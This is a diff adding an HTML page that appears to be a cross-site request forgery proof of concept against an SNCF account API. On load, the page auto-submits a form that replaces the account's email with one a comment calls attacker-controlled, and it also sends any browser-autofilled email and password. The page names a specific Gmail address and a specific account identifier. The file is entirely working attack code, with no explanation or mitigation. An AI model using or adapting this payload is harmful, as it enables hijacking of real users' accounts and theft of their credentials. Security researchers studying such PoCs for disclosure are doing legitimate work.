@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <form action="https://monidentifiant.sncf/api/accounts/c66bb210-1b8b-4b0e-9f83-35f595475e7c?ui_locales=en&callback=https://www.sncf-connect.com/app/account/activation" method="POST">
+      <!-- Current email field (autofilled if served from same origin) -->
+      <input type="email" id="oldMail" name="oldMail" value="">
+      
+      <!-- Current password field (autofilled if saved in browser) -->
+      <input type="password" name="password" value="">
+      
+      <!-- New email controlled by attacker -->
+      <input type="hidden" name="email" value="shadab.idjet@gmail.com">
+    </form>
+    <script>
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
